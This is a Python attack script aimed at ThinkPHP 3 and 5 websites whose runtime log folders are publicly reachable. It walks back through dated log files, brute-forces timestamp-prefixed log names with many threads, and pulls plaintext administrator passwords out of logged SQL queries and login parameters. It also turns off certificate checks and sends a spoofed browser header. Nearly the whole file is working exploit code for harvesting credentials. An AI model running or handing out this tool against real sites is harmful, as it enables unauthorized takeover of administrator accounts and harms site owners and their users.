# encoding: utf8
import requests,argparse,signal
from time import strftime,localtime,mktime,strptime
from sys import exit,argv
from re import findall
from os import path
import random
import threading
requests.packages.urllib3.disable_warnings()


class thread1(threading.Thread):

    def __init__(self,threadingSum,date,log_file,version):
        threading.Thread.__init__(self)
        self.threadingSum = threadingSum
        self.date = date
        self.year = date.split('_')[0]
        self.month = date.split('_')[1]
        self.log_file = log_file
        self.version = version
        if version == '5':
            self.password_pattern = r"'username' => '{}',  'password' => '(.*?)'".format(username)
        else:
            self.password_pattern = r'\`username\` = \'{}\' \) AND \( \`password\` = \'(.*?)\''.format(username)
        self.pattern_time = pattern_time
        self.t = False

    def get_time_stamp(self,url, log_file):
        log_url = url
        r = deal_request(log_url,'get')
        if r != None:
            html = r.text.replace('\n','')
            password = findall(self.password_pattern, html)
            if password != []:
                dist_password = list(set(password))
                for p in dist_password:
                    print('\r[*] {}/{}'.format(username, p))
            else:
                print('[-] {} not'.format(log_url.split('/')[-1]))
            t = findall(self.pattern_time, html.replace(' ',''))
            if t != []:
                T = t[0].replace('T', ' ')
                print('\r[+] {} last time is {} '.format(log_file, T))
            return int(mktime(strptime(T, "%Y-%m-%d %H:%M:%S")))

    def deal_ymd(self,date):
        if self.version == '5':
            time_format = '%Y_%m_%d'
        else:
            time_format = '%y_%m_%d'
        old_TimeAffix = mktime(strptime(date,time_format))
        new_TimeAffix = old_TimeAffix - 86400
        new_Time = strftime(time_format,localtime(new_TimeAffix))

        return new_Time

    def get_log(self):
        while 1:
            if self.version == '5':
                Year = self.date.split('_')[0]
                Month = self.date.split('_')[1]
                Day = self.date.split('_')[2]
                log_file_name = Year+Month+'/{}.log'.format(Day)
                log_url = url+path+log_file_name
            else:
                log_file_name = '{}.log'.format(self.date)
                log_url = url + path + log_file_name
            r = deal_request(log_url,'get')
            if r == None:
                exit(0)
            if r.status_code == 404:
                print('[-] {} status 404 '.format(log_file_name))
                exit(0)
            print('[+] {} status 200'.format(log_file_name))
            html = r.text.replace('\n','')
            password = findall(self.password_pattern, html)
            if password != []:
                dist_password = list(set(password))
                for p in dist_password:
                    print('[*] {}/{}'.format(username, p))
                    self.date = self.deal_ymd(self.date)
            else:
                print('[-] {} not '.format(log_file_name))
                self.date = self.deal_ymd(self.date)

    def run(self):
        with self.threadingSum:
            print('\rTesting {}'.format(self.log_file), end='')
            if self.version == '5':
                log_url = url + path +self.year+self.month+'/'+ self.log_file
            else:
                log_url = url + path + self.log_file
            r = deal_request(log_url,'get')
            if r != None:
                if r.status_code == 200:
                    print('\r[+] {} status 200 '.format(self.log_file))
                    self.t = self.get_time_stamp(log_url, self.log_file)
                if self.t != False:
                    return True
                self.threadingSum.release()

    def return_last_time(self):
        return self.t

def deal_request(url,mode):
    try:
        r = requests.request(mode,url,headers=headers,verify=False,timeout=10)
        return r
    except:
        print('\r[-] {} connect time out '.format(url))
        return None

def get_firstfile_last_time(url,path,date,v):
    if v == '5':
        Year, Month, Day = y_m_d(date)
        log_file_name = Year + Month + '/{}.log'.format(Day)
        log_url = url + path + log_file_name
    else:
        log_file_name = date + '.log'
        log_url = url + path + log_file_name
    r = deal_request(log_url,'get')
    if r == None:
        exit(0)
    if r.status_code == 404:
        print('[-] {} 404'.format(log_file_name))
        exit(0)
    else:
        t = findall(pattern_time,r.text.replace(' ',''))
        if t != []:
            T = t[0].replace('T',' ')
            print('[+] The log last time is {} '.format(T))
            return int(mktime(strptime(T,"%Y-%m-%d %H:%M:%S")))

def parse():
    parser = argparse.ArgumentParser(
        prog=path.split(__file__)[-1],
        description="author by F",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u', '--url', help='Domain pointed to HTTP_AUTH server. e.g.https://domain.com/ ')
    parser.add_argument('-p', '--path', help='The log path e.g.TP3->/App/Runtime/Logs/ TP5->/runtime/log/',default='/App/Runtime/Logs/')
    parser.add_argument('-d', '--date', help='Date e.g.Year_Month_Day',default=strftime("%Y_%m_%d", localtime()))
    parser.add_argument('-n', '--username', help='Get the password for the username',default='admin')
    parser.add_argument('-m', '--mode', help='Is it time stamp {y/n}', default='n')
    parser.add_argument('-v', '--version', help='ThinkPHP version {3/5}', default='3')
    parser.add_argument('-t', '--thread', help='Max thread', default=50)

    try:
        args = parser.parse_args()
    except:
        print("[-] Please refer to -h|--help for help")
        exit(0)

    if len(argv) < 2:
        parser.print_help()
        exit(0)

    if args.version != '3' and args.version != '5':
        print('[-] Invalid ThinkPHP version')
        exit(0)

    if args.version == '3':
        args.date = args.date[2:]
    elif '-p' not in argv and '--path' not in argv:
        args.path = '/runtime/log/'

    if not args.url:
        print('[-] Please input the tp url -u|--url')
        exit(0)
    else:
        return args.url,args.path,args.date,args.username,args.mode,args.version,args.thread

def y_m_d(date):
    y = date.split('_')[0]
    m = date.split('_')[1]
    d = date.split('_')[2]
    return y,m,d

def main():
    global headers,url,path,username,pattern_time
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
    }

    url, path, date, username, mode,version,thread = parse()
    threadingSum = threading.Semaphore(int(thread))
    pattern_time = '\[(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})\+08:00\]'
    if mode == 'y':
        T = get_firstfile_last_time(url,path,date,version)
        while 1:
            if version == '5':
                log_file = '{}-{}.log'.format(str(T), date.split('_')[2])
            else:
                log_file = '{}-{}.log'.format(str(T), date)
            threadingSum.acquire()
            test = thread1(threadingSum, date,log_file,version)
            test.start()
            test.join()
            tOf = test.return_last_time()
            if tOf != False:
                T = test.return_last_time()

            if tOf == True:
                break
            T = T - 1

        for t in threading.enumerate():
            if t is threading.currentThread():
                continue
            t.join()
    elif mode == 'n':
        test = thread1(threading,date,None,version)
        test.get_log()


if __name__ == '__main__':
    main()